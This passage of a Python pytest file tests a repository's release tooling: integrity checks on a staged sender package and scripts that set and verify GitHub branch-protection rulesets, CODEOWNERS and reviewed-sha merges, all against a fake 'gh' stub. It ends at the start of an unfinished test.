    elif tamper == "change-module":
        (py / "common.py").write_text(plant + (py / "common.py").read_text())
    elif tamper == "change-config":
        (lib / "site.yml").write_text((lib / "site.yml").read_text() + "\n")
    elif tamper == "remove-module":
        (py / "render.py").unlink()
    elif tamper == "add-symlink":
        (py / "x.py").symlink_to(work / "json.py")
    else:
        (py / "common.py").chmod(0o777)
    plan_dir = tmp_path / "plan" / "2026-11-12"
    plan_dir.mkdir(parents=True)
    (plan_dir / "plan.json").write_text("{}")
    for name in PY_STEPS:
        r = _run_py_step(name, work, runner, lib_env, env, plan_dir / "plan.json")
        assert r.returncode == 2 and "the staged sender changed after it was staged" in r.stdout, (name, r.stderr)
    assert not marker.exists()


def test_the_stage_step_copies_only_senders_own_python_files(tmp_path):
    """From the commit's git objects: no symlink (it could point at an unchecked file), no __pycache__ (an
    unchecked-hash .pyc loads without its source), no subfolder and no other file type reaches the staged folder;
    a sender or config/site.yml that is a symlink stages nothing and the step fails."""
    work = tmp_path / "work"
    (work / "sender" / "__pycache__").mkdir(parents=True)
    (work / "sender" / "sub").mkdir()
    for f in (ROOT / "sender").glob("*.py"):
        shutil.copy(f, work / "sender" / f.name)
    (work / "config").mkdir()
    shutil.copy(ROOT / "config" / "site.yml", work / "config" / "site.yml")
    (work / "evil.py").write_text("x = 1\n")
    (work / "sender" / "linked.py").symlink_to("../evil.py")
    (work / "sender" / "__pycache__" / "deliver.cpython-312.pyc").write_bytes(b"\0" * 16)
    (work / "sender" / "sub" / "x.py").write_text("x = 1\n")
    (work / "sender" / "notes.txt").write_text("x\n")
    # the blobs as committed: no .gitattributes rule (export-ignore, export-subst) changes what is staged
    (work / ".gitattributes").write_text("sender/common.py export-ignore\nsender/*.py export-subst\n")
    (work / "sender" / "common.py").write_text((work / "sender" / "common.py").read_text() + "# $Format:%H$\n")
    _commit_all(work)
    (work / "sender" / "uncommitted.py").write_text("x = 1\n")                    # the working folder is not read
    runner = tmp_path / "runner"
    runner.mkdir()
    staged, lib_env = _stage(work, runner)
    assert staged.returncode == 0, staged.stderr
    lib = Path(lib_env["NOTE_LIB"])
    assert sorted(p.name for p in (lib / "py" / "sender").iterdir()) == sorted(
        p.name for p in (ROOT / "sender").glob("*.py"))
    assert sorted(p.name for p in lib.iterdir()) == ["py", "site.yml"] and not any(
        p.is_symlink() for p in lib.rglob("*"))
    assert re.fullmatch(r"[0-9a-f]{64}", lib_env["NOTE_LIB_SUM"])
    assert (lib / "py" / "sender" / "common.py").read_text().endswith("# $Format:%H$\n")
    assert (lib / "py" / "sender" / "deliver.py").read_bytes() == (ROOT / "sender" / "deliver.py").read_bytes()
    for rel, target in (("sender", "real"), ("config/site.yml", "../site.yml")):
        w2 = tmp_path / f"w-{rel.replace('/', '-')}"
        shutil.copytree(work, w2, symlinks=True, ignore=shutil.ignore_patterns(".git"))
        if rel == "sender":
            (w2 / "sender").rename(w2 / "real")
        else:
            shutil.copy(w2 / "config" / "site.yml", w2 / "site.yml")
            (w2 / "config" / "site.yml").unlink()
        (w2 / rel).symlink_to(target)
        _commit_all(w2)
        other = tmp_path / f"r-{rel.replace('/', '-')}"
        other.mkdir()
        r, wrote = _stage(w2, other)
        assert r.returncode == 2 and wrote == {}, (rel, r.stderr)


# ------------------------------------------------------------------ the main ruleset scripts (runbook step 2.0.1)
_GH_STUB = '''#!/usr/bin/env python3
import json, os, sys
a = sys.argv[1:]
with open(os.environ["GH_CALLS"], "a") as f:
    f.write(" ".join(a) + "\\n")
if a[:2] == ["auth", "status"]:
    sys.exit(0)
if "-X" in a:
    if "POST" in a:                        # the new ruleset is listed from now on, as on GitHub
        os.environ["EXISTING"] = "99"
        open(os.environ["GH_CALLS"] + ".created", "w").close()
    if "can_approve_pull_request_reviews=true" in a:
        open(os.environ["GH_CALLS"] + ".r2on", "w").close()
    sys.exit(0)
if os.path.exists(os.environ["GH_CALLS"] + ".created"):
    os.environ["EXISTING"] = "99"
path = [x for x in a if x.startswith("repos/")][0]
if path == "repos/gn0sh/clarksville-records/contents/.github/workflows/daily-update.yml?ref=main":
    assert a[-2:] == ["-H", "Accept: application/vnd.github.raw"], a
    print(os.environ["MAIN_WF"])
    sys.exit(0)
if path == "repos/gn0sh/clarksville-records/contents/.github/CODEOWNERS?ref=main":
    assert a[-2:] == ["-H", "Accept: application/vnd.github.raw"], a
    if os.environ.get("CO_MISSING"):
        sys.exit(1)                        # gh: HTTP 404
    print(os.environ.get("CO_TEXT", "# ADR 0010\\n* @gn0sh\\n/data/\\n"), end="")
    sys.exit(0)
jq = a[a.index("--jq") + 1]
if path == "repos/gn0sh/clarksville-records/codeowners/errors?ref=main":
    assert jq == ".errors | length", jq
    if os.environ.get("CO_ERRORS") == "FAIL":
        sys.exit(1)
    print(os.environ.get("CO_ERRORS", "0"))
elif jq == ".rules[].parameters | select(. != null) | .require_code_owner_review":
    print(os.environ.get("OWNER", "true"))
elif jq == ".rules[].parameters | select(. != null) | .allowed_merge_methods[]?":
    print(os.environ.get("METHODS", "squash"))
elif jq == ".rules[].parameters | select(. != null) | .dismiss_stale_reviews_on_push":
    print(os.environ.get("STALE", "true"))
elif path.endswith("/actions/permissions/workflow"):
    assert jq == ".can_approve_pull_request_reviews", jq
    r2 = "true" if os.path.exists(os.environ["GH_CALLS"] + ".r2on") else os.environ.get("R2", "false")
    if r2 == "FAIL":
        sys.exit(1)
    print(r2)
elif path.endswith("/git/ref/heads/main"):
    assert jq == ".object.sha", jq
    if os.environ.get("MAIN_SHA") == "FAIL":
        sys.exit(1)
    print(os.environ.get("MAIN_SHA", "1" * 40))
elif path == "repos/gn0sh/clarksville-records":
    assert jq == ".allow_auto_merge", jq
    print(os.environ.get("AUTO", "false"))
elif jq == ".rules[].parameters.required_approving_review_count // empty":
    print(os.environ.get("APPROVALS", "0"))
elif path.endswith("/rulesets"):
    assert jq == ".[] | select(.name == $ENV.RULESET_NAME) | .id", jq
    assert os.environ["RULESET_NAME"] == "main: pull request required"
    for i in os.environ["EXISTING"].split():
        print(i)
elif path.endswith("/rules/branches/main"):
    print("pull_request\\ndeletion\\nnon_fast_forward")
elif jq == ".enforcement":
    print("active")
else:
    assert jq == ".bypass_actors[] | [.actor_type, .actor_id, .bypass_mode] | @tsv", jq
    print(os.environ.get("BYPASS", "RepositoryRole\\t5\\tpull_request\\n"), end="")   # R1': the admin role, PRs only
'''


@pytest.mark.parametrize("existing", ["", "42", "42 43"])
def test_protect_main_creates_once_and_updates_after(tmp_path, existing):
    """note-runbook/ruleset-flow: a ruleset of that name already there is updated (PUT), never duplicated (POST)."""
    bindir, calls = tmp_path / "bin", tmp_path / "gh-calls"
    bindir.mkdir()
    (bindir / "gh").write_text(_GH_STUB)
    (bindir / "gh").chmod(0o755)
    env = {**os.environ, "PATH": f"{bindir}:{os.environ['PATH']}", "GH_CALLS": str(calls), "EXISTING": existing,
           "MAIN_WF": TEXT}
    r = subprocess.run(["bash", str(ROOT / "scripts" / "protect-main.sh")], env=env, capture_output=True, text=True)
    assert r.returncode == 0 and "OK: main is protected" in r.stdout, r.stdout + r.stderr
    assert "bypass RepositoryRole:5:pull_request, required approvals 0" in r.stdout
    assert "Code-owner review: true, merge methods: squash, dismiss stale reviews: true" in r.stdout
    assert "GitHub Actions may create pull requests: true" in r.stdout
    assert "Auto-merge allowed: false" in r.stdout
    lines = calls.read_text().splitlines()
    # main-protect/window-start-gap: main's sha is read (and printed) BEFORE R1 (the ruleset) is written; L-b: R1
    # before R2's state is read; then R2 goes on, and the line naming that pre-R1 sha (the start of the runbook
    # 4.7.1 window) is printed
    setting = [i for i, c in enumerate(lines) if "-X PUT" in c and "actions/permissions/workflow" in c]
    writes = [i for i, c in enumerate(lines) if ("-X PUT" in c or "-X POST" in c) and "/rulesets" in c]
    read_r2 = next(i for i, c in enumerate(lines) if "actions/permissions/workflow" in c and "-X" not in c)
    read_main = [i for i, c in enumerate(lines) if "/git/ref/heads/main" in c]
    assert len(read_main) == 1 and len(setting) == 1 and writes
    assert read_main[0] < min(writes) and max(writes) < read_r2 < setting[0]
    assert "-F can_approve_pull_request_reviews=true" in lines[setting[0]]
    assert f"Main before the ruleset: {'1' * 40}" in r.stdout
    assert f"R2 was off; main was {'1' * 40}" in r.stdout
    assert r.stdout.index("Main before the ruleset") < r.stdout.index("R2 was off")
    # main-protect/window-start-first-run: a ruleset already there means an earlier run; say whose sha starts it
    not_first = "Not the first run: the window starts at the first run's 'Main before the ruleset' sha."
    assert (not_first in r.stdout) == bool(existing)
    if existing:
        assert r.stdout.count(not_first) == len(existing.split())
    lines = [c for c in lines if "actions/permissions/workflow" not in c and "/git/ref/" not in c]
    posts = [c for c in lines if "-X POST" in c]
    puts = [c.split()[3] for c in lines if "-X PUT" in c]
    if existing:
        assert not posts and puts == [f"repos/gn0sh/clarksville-records/rulesets/{i}" for i in existing.split()]
    else:
        assert len(posts) == 1 and not puts
    assert all("main-ruleset.json" in c for c in lines if " -X " in f" {c}")


_R1P_BYPASS = "RepositoryRole\t5\tpull_request\n"


@pytest.mark.parametrize("bypass", [_R1P_BYPASS, "", "Integration\t15368\talways\n", "RepositoryRole\t5\talways\n",
                                    "RepositoryRole\t4\tpull_request\n",
                                    _R1P_BYPASS + "Integration\t15368\tpull_request\n"])
def test_protect_main_refuses_before_main_opens_data_prs_and_flags_a_bypass(tmp_path, bypass):
    """Without the bypass, the old push job (git push to main) would fail every day: the script changes nothing until
    main's workflow has the data PR step. ADR 0010 (R1'): the bypass is exactly the admin role (5) in pull request
    mode; none, another actor, an extra actor or mode "always" (a direct push to main) is NOT OK."""
    bindir, calls = tmp_path / "bin", tmp_path / "gh-calls"
    bindir.mkdir()
    (bindir / "gh").write_text(_GH_STUB)
    (bindir / "gh").chmod(0o755)
    env = {**os.environ, "PATH": f"{bindir}:{os.environ['PATH']}", "GH_CALLS": str(calls), "EXISTING": "42",
           "MAIN_WF": TEXT.replace("Open and merge the data pull request", "old push job"), "BYPASS": bypass}
    r = subprocess.run(["bash", str(ROOT / "scripts" / "protect-main.sh")], env=env, capture_output=True, text=True)
    assert r.returncode == 1 and "Nothing was changed" in r.stdout
    assert not any(" -X " in f" {c}" for c in calls.read_text().splitlines())
    env["MAIN_WF"] = TEXT
    r = subprocess.run(["bash", str(ROOT / "scripts" / "protect-main.sh")], env=env, capture_output=True, text=True)
    assert (r.returncode == 0) == (bypass == _R1P_BYPASS), r.stdout
    if bypass != _R1P_BYPASS:
        assert "The bypass must be exactly the admin role in pull request mode" in r.stdout


@pytest.mark.parametrize("over,says", [
    ({"CO_MISSING": "1"}, "Main has no .github/CODEOWNERS yet. Nothing was changed."),
    ({"CO_ERRORS": "2"}, "GitHub lists errors in main's .github/CODEOWNERS ('2'). Nothing was changed."),
    ({"CO_ERRORS": "FAIL"}, "GitHub lists errors in main's .github/CODEOWNERS (''). Nothing was changed."),
    ({"CO_TEXT": "* @gn0sh\n"}, "(it has: * @gn0sh). Nothing was changed."),
    ({"CO_TEXT": "* @gn0sh\n/data/ @gn0sh\n"}, "(it has: * @gn0sh|/data/ @gn0sh). Nothing was changed."),
    ({"CO_TEXT": "/data/\n* @gn0sh\n"}, "(it has: /data/|* @gn0sh). Nothing was changed."),
    ({"CO_TEXT": "* @gn0sh\n/data/\n* @someone\n"}, "Nothing was changed."),
    ({"CO_TEXT": ""}, "(it has: ). Nothing was changed."),
    ({"CO_TEXT": "* @gn0sh\n/data/\n/.github/ @someone\n"}, "(it has: * @gn0sh|/data/|/.github/ @someone)."),
    ({"CO_TEXT": "* @GN0SH\n/data/\n"}, "(it has: * @GN0SH|/data/)."),
])
def test_protect_main_changes_nothing_without_a_clean_codeowners_on_main(tmp_path, over, says):
    """ADR 0010 / T4.11.2: R1' binds only through .github/CODEOWNERS on main. If it is missing, its rules are not
    exactly '* @gn0sh' then '/data/' (order matters: the last match wins), GitHub reports an error in it, or the error
    list cannot be read, the script stops before reading main or writing anything."""
    bindir, calls = tmp_path / "bin", tmp_path / "gh-calls"
    bindir.mkdir()
    (bindir / "gh").write_text(_GH_STUB)
    (bindir / "gh").chmod(0o755)
    env = {**os.environ, "PATH": f"{bindir}:{os.environ['PATH']}", "GH_CALLS": str(calls), "EXISTING": "42",
           "MAIN_WF": TEXT, **over}
    r = subprocess.run(["bash", str(ROOT / "scripts" / "protect-main.sh")], env=env, capture_output=True, text=True)
    assert r.returncode == 1 and says in r.stdout, r.stdout + r.stderr
    lines = calls.read_text().splitlines()
    assert not any(" -X " in f" {c}" for c in lines)
    assert not any("/git/ref/heads/main" in c for c in lines) and "Main before the ruleset" not in r.stdout


def test_protect_main_accepts_the_committed_codeowners_with_crlf(tmp_path):
    """The file as committed (comment line included) passes, also with Windows line ends."""
    bindir, calls = tmp_path / "bin", tmp_path / "gh-calls"
    bindir.mkdir()
    (bindir / "gh").write_text(_GH_STUB)
    (bindir / "gh").chmod(0o755)
    text = (ROOT / ".github" / "CODEOWNERS").read_text(encoding="utf-8")
    for co in (text, text.replace("\n", "\r\n"), text.replace("* @gn0sh", "*\t @gn0sh  ")):
        env = {**os.environ, "PATH": f"{bindir}:{os.environ['PATH']}", "GH_CALLS": str(calls), "EXISTING": "42",
               "MAIN_WF": TEXT, "CO_TEXT": co}
        r = subprocess.run(["bash", str(ROOT / "scripts" / "protect-main.sh")], env=env, capture_output=True,
                           text=True)
        assert r.returncode == 0 and "OK: main is protected" in r.stdout, r.stdout + r.stderr


@pytest.mark.parametrize("owner,methods,ok,says,stale", [
    ("true", "squash", True, "", "true"),
    ("true", "squash", False, "Dismiss stale approvals on push must be on (ADR 0010, M3).", "false"),
    ("true", "squash", False, "Dismiss stale approvals on push must be on (ADR 0010, M3).", ""),
    ("false", "squash", False, "Code-owner review must be on", "true"),
    ("", "squash", False, "Code-owner review must be on", "true"),
    ("true", "merge\nsquash\nrebase", False, "Squash must be the only merge method", "true"),
    ("true", "", False, "Squash must be the only merge method", "true"),
])
def test_protect_main_needs_code_owner_review_and_squash_only(tmp_path, owner, methods, ok, says, stale):
    """ADR 0010 (R1'): the OK check reads code-owner review on and squash as the only merge method, else NOT OK."""
    bindir, calls = tmp_path / "bin", tmp_path / "gh-calls"
    bindir.mkdir()
    (bindir / "gh").write_text(_GH_STUB)
    (bindir / "gh").chmod(0o755)
    env = {**os.environ, "PATH": f"{bindir}:{os.environ['PATH']}", "GH_CALLS": str(calls), "EXISTING": "42",
           "MAIN_WF": TEXT, "OWNER": owner, "METHODS": methods, "STALE": stale}
    r = subprocess.run(["bash", str(ROOT / "scripts" / "protect-main.sh")], env=env, capture_output=True, text=True)
    assert (r.returncode == 0) == ok, r.stdout + r.stderr
    assert says in r.stdout and (("OK: main is protected" in r.stdout) == ok)


def test_protect_main_ps1_has_the_r1_prime_checks():
    """No PowerShell here: the .ps1 twin of the CODEOWNERS refusals and the R1' OK checks, line by line."""
    ps1 = (ROOT / "scripts" / "protect-main.ps1").read_text(encoding="utf-8")
    sh = (ROOT / "scripts" / "protect-main.sh").read_text(encoding="utf-8")
    for text in (ps1, sh):
        for part in ('"repos/$repo/contents/.github/CODEOWNERS?ref=main" -H \'Accept: application/vnd.github.raw\'',
                     '"repos/$repo/codeowners/errors?ref=main" --jq \'.errors | length\'',
                     "--jq '.bypass_actors[] | [.actor_type, .actor_id, .bypass_mode] | @tsv'",
                     "--jq '.rules[].parameters | select(. != null) | .require_code_owner_review'",
                     "--jq '.rules[].parameters | select(. != null) | .allowed_merge_methods[]?'",
                     "Main has no .github/CODEOWNERS yet. Nothing was changed.",
                     "Main's .github/CODEOWNERS is not '* @gn0sh' then '/data/' (it has: ",
                     "The bypass must be exactly the admin role in pull request mode (RepositoryRole:5:pull_request).",
                     "Code-owner review must be on (ADR 0010).", "Squash must be the only merge method (ADR 0010).",
                     "--jq '.rules[].parameters | select(. != null) | .dismiss_stale_reviews_on_push'",
                     "Dismiss stale approvals on push must be on (ADR 0010, M3)."):
            assert part in text, part
    # case-sensitive comparisons (PowerShell's -ne and -match ignore case)
    assert "$coRules -cne '* @gn0sh|/data/'" in ps1 and "$_ -cnotmatch '^(#|$)'" in ps1
    assert "($_ -replace '\\s+', ' ').Trim()" in ps1 and "s/[[:space:]]+/ /g; s/^ //; s/ $//" in sh
    assert "$actors -cne 'RepositoryRole:5:pull_request'" in ps1 and "$owner -cne 'true'" in ps1
    assert "$stale -cne 'true'" in ps1 and '[ "$stale" = true ]' in sh
    assert "$methods -cne 'squash'" in ps1 and "$coErrors -cne '0'" in ps1 and "$enf -cne 'active'" in ps1
    # the CODEOWNERS checks come before main is read and before anything is written
    for text, read_main in ((ps1, '$mainSha = (gh api'), (sh, 'main_sha=$(gh api')):
        assert text.index("CODEOWNERS?ref=main") < text.index("codeowners/errors") < text.index(read_main)
        assert text.index(read_main) < text.index("-X POST")
    assert "-ExecutionPolicy Bypass" not in ps1.replace("never -ExecutionPolicy Bypass", "")


def _codeowners_parse(text: str, ps1: bool) -> list:
    """The lines that read main's CODEOWNERS into its rules: from the parse line to the line that ends it."""
    start = "$coRules = (" if ps1 else "co_rules=$("
    lines = text.splitlines()
    i = next(n for n, ln in enumerate(lines) if ln.startswith(start))
    return lines[i:i + 2]


def test_codeowners_parsing_is_identical_in_protect_main_and_the_probe():
    """protect-main/ps1-parity-untested: the .ps1 cannot run here, so its CODEOWNERS parsing is pinned to be the same
    text as the probe's (and the .sh pair likewise, which the fake-gh tests run); the read before it is the same too."""
    for ext, ps1 in (("sh", False), ("ps1", True)):
        pm = (ROOT / "scripts" / f"protect-main.{ext}").read_text(encoding="utf-8")
        probe = (ROOT / "scripts" / f"v1-probe.{ext}").read_text(encoding="utf-8")
        a, b = _codeowners_parse(pm, ps1), _codeowners_parse(probe, ps1)
        assert a == b and len(a) == 2, (ext, a, b)
        assert ("$codeowners" in a[0]) if ps1 else ('"$codeowners"' in a[0]), a
        for text in (pm, probe):
            assert "contents/.github/CODEOWNERS?ref=main" in text and "Accept: application/vnd.github.raw" in text


def test_the_ruleset_rollback_is_one_piped_line_from_a_reachable_commit():
    """ops-runbook/rollback-ref-unreachable: the rollback reads the pre-R1' json from 91d2ecc (main; a branch commit
    is gone after a squash merge) and pipes it, since a `>` redirect in Windows PowerShell 5.1 writes UTF-16."""
    runbook = (ROOT / "docs" / "ops" / "morning-note.md").read_text(encoding="utf-8")
    line = ("git show 91d2ecc:scripts/main-ruleset.json | gh api -X PUT repos/gn0sh/clarksville-records/rulesets/27502319"
            " --input -")
    assert line in runbook and "eda3835" not in runbook and "r1.json" not in runbook
    r = subprocess.run(["git", "show", "91d2ecc:scripts/main-ruleset.json"], cwd=ROOT, capture_output=True, text=True)
    if r.returncode == 0:                         # a shallow checkout may not have it
        old = json.loads(r.stdout)
        assert old["bypass_actors"] == [] and old["name"] == "main: pull request required"


def test_codeowners_text_is_pinned():
    """ADR 0010 decision 1: every path outside data/ is owned by gn0sh; /data/ has no owner (a pattern without owners
    leaves those files unowned), so the push job's data-only pull request needs no review."""
    text = (ROOT / ".github" / "CODEOWNERS").read_text(encoding="utf-8")
    lines = text.splitlines()
    assert text.endswith("\n") and len(lines) == 3
    assert lines[0].startswith("#") and "ADR 0010" in lines[0]
    assert lines[1:] == ["* @gn0sh", "/data/"]


@pytest.mark.parametrize("auto,approvals,ok", [("false", "0", True), ("true", "0", False), ("false", "1", False),
                                               ("false", "", False)])
def test_protect_main_needs_approvals_0_and_auto_merge_off(tmp_path, auto, approvals, ok):
    """main-protect L-D, L-E: auto-merge off and required approvals exactly 0, or NOT OK naming what differs."""
    bindir, calls = tmp_path / "bin", tmp_path / "gh-calls"
    bindir.mkdir()
    (bindir / "gh").write_text(_GH_STUB)
    (bindir / "gh").chmod(0o755)
    env = {**os.environ, "PATH": f"{bindir}:{os.environ['PATH']}", "GH_CALLS": str(calls), "EXISTING": "42",
           "MAIN_WF": TEXT, "AUTO": auto, "APPROVALS": approvals}
    r = subprocess.run(["bash", str(ROOT / "scripts" / "protect-main.sh")], env=env, capture_output=True, text=True)
    assert (r.returncode == 0) == ok, r.stdout
    if auto == "true":
        assert "Auto-merge must be off" in r.stdout
    if approvals != "0":
        assert "needs ADR 0009 changed" in r.stdout


@pytest.mark.parametrize("r2,code,says", [
    ("true", 0, "R2 already on"),
    ("FAIL", 1, "it was not changed"),
])
def test_protect_main_reads_r2_before_turning_r2_on(tmp_path, r2, code, says):
    """L-b: R2 already on is said (the window start is then unknown); a failed read of R2 leaves R2 as it was,
    after the ruleset is written."""
    bindir, calls = tmp_path / "bin", tmp_path / "gh-calls"
    bindir.mkdir()
    (bindir / "gh").write_text(_GH_STUB)
    (bindir / "gh").chmod(0o755)
    env = {**os.environ, "PATH": f"{bindir}:{os.environ['PATH']}", "GH_CALLS": str(calls), "EXISTING": "42",
           "MAIN_WF": TEXT, "R2": r2}
    r = subprocess.run(["bash", str(ROOT / "scripts" / "protect-main.sh")], env=env, capture_output=True, text=True)
    assert r.returncode == code and says in r.stdout, r.stdout + r.stderr
    lines = calls.read_text().splitlines()
    assert not any("-X PUT" in c and "actions/permissions/workflow" in c for c in lines)
    assert any("-X PUT" in c and "/rulesets/42" in c for c in lines)
    assert "R2 was off" not in r.stdout and f"Main before the ruleset: {'1' * 40}" in r.stdout


@pytest.mark.parametrize("main_sha", ["FAIL", "not-a-sha", ""])
def test_protect_main_changes_nothing_when_main_cannot_be_read(tmp_path, main_sha):
    """main-protect/window-start-gap: main's sha is read before R1 is written; if that read fails, nothing is
    written (no ruleset, no R2) and no window line is printed."""
    bindir, calls = tmp_path / "bin", tmp_path / "gh-calls"
    bindir.mkdir()
    (bindir / "gh").write_text(_GH_STUB)
    (bindir / "gh").chmod(0o755)
    env = {**os.environ, "PATH": f"{bindir}:{os.environ['PATH']}", "GH_CALLS": str(calls), "EXISTING": "42",
           "MAIN_WF": TEXT, "MAIN_SHA": main_sha}
    r = subprocess.run(["bash", str(ROOT / "scripts" / "protect-main.sh")], env=env, capture_output=True, text=True)
    assert r.returncode == 1 and "Could not read main's commit. Nothing was changed." in r.stdout, r.stdout
    assert not any(" -X " in f" {c}" for c in calls.read_text().splitlines())
    assert "Main before the ruleset" not in r.stdout and "R2 was off" not in r.stdout


def test_protect_main_sh_and_ps1_agree_on_the_r2_window_line():
    """The .sh order is run by the tests above; the .ps1 (no PowerShell here) is checked line by line."""
    sh = (ROOT / "scripts" / "protect-main.sh").read_text(encoding="utf-8")
    assert 'echo "R2 already on"' in sh and 'echo "R2 was off; main was $main_sha"' in sh
    ps1 = (ROOT / "scripts" / "protect-main.ps1").read_text(encoding="utf-8")
    assert "Write-Host 'R2 already on'" in ps1 and 'Write-Host "R2 was off; main was $mainSha"' in ps1
    assert ps1.count("$mainSha = (gh api \"repos/$repo/git/ref/heads/main\" --jq '.object.sha') -join ''") == 1
    assert 'Write-Host "Main before the ruleset: $mainSha"' in ps1 and 'echo "Main before the ruleset: $main_sha"' in sh
    assert ("Write-Host \"Not the first run: the window starts at the first run's 'Main before the ruleset' sha.\""
            in ps1)
    # main-protect/window-start-gap: main is read before the ruleset is written (POST or PUT), R2 after
    read_main = ps1.index('$mainSha = (gh api "repos/$repo/git/ref/heads/main"')
    create = ps1.index('gh api -X POST "repos/$repo/rulesets" --input $body --silent')
    update = ps1.index('gh api -X PUT "repos/$repo/rulesets/$id" --input $body --silent')
    turn_on = ps1.index('gh api -X PUT "repos/$repo/actions/permissions/workflow" -F can_approve_pull_request_reviews=true')
    assert read_main < create < update < turn_on


def test_protect_main_scripts_share_one_ruleset_body():
    body = json.loads((ROOT / "scripts" / "main-ruleset.json").read_text(encoding="utf-8"))
    assert body["name"] == "main: pull request required" and body["enforcement"] == "active"
    # ADR 0010 (R1'): one bypass, the Repository admin role (5), for pull requests only: nobody pushes main directly
    # (main-protect/actions-bypass-reopens-M1), and a non-data PR merges only by a person's bypass merge
    assert body["bypass_actors"] == [{"actor_id": 5, "actor_type": "RepositoryRole", "bypass_mode": "pull_request"}]
    pr_rule = [r for r in body["rules"] if r["type"] == "pull_request"]
    assert len(pr_rule) == 1 and pr_rule[0]["parameters"]["required_approving_review_count"] == 0     # L-E
    # every other parameter as GitHub returned it on 2026-11-18 (ruleset 27502319), except dismiss_stale_reviews_on_push
    # (M3 main-protect/stale-owner-approval: an owner approval does not survive a later push). The unattributed-changes
    # parameter is kept at its live value: Copilot-authored PRs only, no effect at 0 approvals (L1, platform-facts).
    assert pr_rule[0]["parameters"] == {
        "required_approving_review_count": 0, "dismiss_stale_reviews_on_push": True, "required_reviewers": [],
        "require_code_owner_review": True, "require_last_push_approval": False,
        "required_review_thread_resolution": False, "require_extra_approval_for_unattributed_changes": True,
        "allowed_merge_methods": ["squash"]}
    assert sorted(r["type"] for r in body["rules"]) == ["deletion", "non_fast_forward", "pull_request"]
    assert body["conditions"]["ref_name"]["include"] == ["~DEFAULT_BRANCH"]
    for name in ("protect-main.ps1", "protect-main.sh"):
        text = (ROOT / "scripts" / name).read_text(encoding="utf-8")
        assert "main-ruleset.json" in text and "main: pull request required" in text and "-X PUT" in text, name
        assert "15368" not in text and "can_approve_pull_request_reviews=true" in text, name
        assert "Open and merge the data pull request" in text, name
    ps1 = (ROOT / "scripts" / "protect-main.ps1").read_text(encoding="utf-8")
    # no double quote inside a --jq argument: Windows PowerShell 5.1 strips them on the way to gh
    assert not re.search(r"--jq '[^']*\"", ps1) and "$ENV.RULESET_NAME" in ps1


# ------------------------------------------------------------------ S2: scripts/merge-reviewed (T4.10.4, L-D)
_MR_STUB = '''#!/usr/bin/env python3
import json, os, sys
a = sys.argv[1:]
with open(os.environ["GH_CALLS"], "a") as f:
    f.write(json.dumps(a) + "\\n")
if a[:2] == ["auth", "status"]:
    sys.exit(0)
if a[:2] == ["api", "repos/gn0sh/clarksville-records/pulls/31"]:
    print(os.environ["PR_LINE"]); sys.exit(0)
if "/reviews" in a[3]:
    print(os.environ.get("KEPT", os.environ["SHA"])); sys.exit(0)
if a[3].endswith("/merge"):
    print("a" * 40); sys.exit(0)
sys.exit(0)
'''


def _merge_reviewed(tmp_path, args, pr_line, kept=None):
    bindir, calls = tmp_path / "bin", tmp_path / "calls"
    bindir.mkdir()
    (bindir / "gh").write_text(_MR_STUB)
    (bindir / "gh").chmod(0o755)
    sha = "b" * 40
    env = {**os.environ, "PATH": f"{bindir}:{os.environ['PATH']}", "GH_CALLS": str(calls), "PR_LINE": pr_line,
           "SHA": sha, **({"KEPT": kept} if kept else {})}
    r = subprocess.run(["bash", str(ROOT / "scripts" / "merge-reviewed.sh"), *args], env=env, capture_output=True,
                       text=True)
    made = [json.loads(ln) for ln in calls.read_text().splitlines()] if calls.exists() else []
    return r, [c for c in made if c[0] == "api"]


def test_merge_reviewed_reviews_then_merges_pinned_to_the_reviewed_sha(tmp_path):
    sha = "b" * 40
    r, made = _merge_reviewed(tmp_path, ["31", sha, "docs/reviews/code-review-x.md", "docs/reviews/qa-x.md"],
                              f"open main {sha} claude/x gn0sh/clarksville-records")
    assert r.returncode == 0, r.stdout + r.stderr
    R = "repos/gn0sh/clarksville-records"
    assert made[0][:2] == ["api", f"{R}/pulls/31"]
    review, merge, delete = made[1], made[2], made[3]
    assert review[:4] == ["api", "-X", "POST", f"{R}/pulls/31/reviews"]
    assert f"commit_id={sha}" in review and "event=COMMENT" in review
    body = next(x for x in review if x.startswith("body="))
    assert sha in body and "docs/reviews/code-review-x.md" in body and "docs/reviews/qa-x.md" in body
    assert merge[:4] == ["api", "-X", "PUT", f"{R}/pulls/31/merge"]
    assert "merge_method=squash" in merge and f"sha={sha}" in merge
    assert delete[:4] == ["api", "-X", "DELETE", f"{R}/git/refs/heads/claude/x"] and len(made) == 4
    assert f"as {'a' * 40}" in r.stdout


@pytest.mark.parametrize("args,pr_line", [
    (["31", "b" * 40, "report"], "open main " + "c" * 40 + " claude/x gn0sh/clarksville-records"),   # head moved
    (["31", "b" * 40, "report"], "closed main " + "b" * 40 + " claude/x gn0sh/clarksville-records"),
    (["31", "b" * 40, "report"], "open dev " + "b" * 40 + " claude/x gn0sh/clarksville-records"),
    (["31", "b" * 7, "report"], "open main " + "b" * 40 + " claude/x gn0sh/clarksville-records"),     # short sha
    (["31", "B" * 40, "report"], "open main " + "B" * 40 + " claude/x gn0sh/clarksville-records"),
    (["31", "b" * 40], "open main " + "b" * 40 + " claude/x gn0sh/clarksville-records"),              # no report
    (["x", "b" * 40, "report"], "open main " + "b" * 40 + " claude/x gn0sh/clarksville-records"),
], ids=["moved-head", "closed", "not-main", "short-sha", "upper-sha", "no-report", "bad-pr"])
def test_merge_reviewed_refuses_without_reviewing_or_merging(tmp_path, args, pr_line):
    r, made = _merge_reviewed(tmp_path, args, pr_line)
    assert r.returncode == 1 and ("Nothing done" in r.stdout or "Usage" in r.stdout), r.stdout
    assert not any("-X" in c for c in made)
    if args[1] == "b" * 40 and pr_line.startswith("open main c"):
        assert "changed after the review" in r.stdout


def test_merge_reviewed_does_not_merge_when_the_review_lands_elsewhere(tmp_path):
    sha = "b" * 40
    r, made = _merge_reviewed(tmp_path, ["31", sha, "report"], f"open main {sha} claude/x gn0sh/clarksville-records",
                              kept="d" * 40)
    assert r.returncode == 1 and not any(c[3].endswith("/merge") for c in made if len(c) > 3)


def test_merge_reviewed_ps1_matches_the_sh():
    ps1 = (ROOT / "scripts" / "merge-reviewed.ps1").read_text(encoding="utf-8")
    for s in ("event=COMMENT", "commit_id=$Sha", "merge_method=squash", "sha=$Sha", "-X DELETE", "@tsv",
              "changed after the review"):
        assert s in ps1, s
    assert not re.search(r"--jq '[^']*\"", ps1)          # no double quote inside a --jq argument (PowerShell 5.1)


# ------------------------------------------------------------------ V1 probe (T4.10.1): files and script
def test_the_v1_probe_workflows_are_inert_and_least_privilege():
